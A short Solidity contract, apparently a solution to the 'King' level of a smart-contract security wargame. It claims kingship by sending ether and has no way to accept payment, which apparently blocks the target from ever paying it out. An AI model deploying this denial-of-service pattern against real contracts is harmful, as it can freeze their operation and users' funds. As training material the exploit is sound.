// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "../../../src/levels/09-King/King.sol";

contract KingAttack {
    King k;

    constructor(address payable _target) payable {
        k = King(_target);
        (
            bool success, /*bytes memory data*/

        ) = address(k).call{value: msg.value}("");
        require(success, "failed.");
    }
}
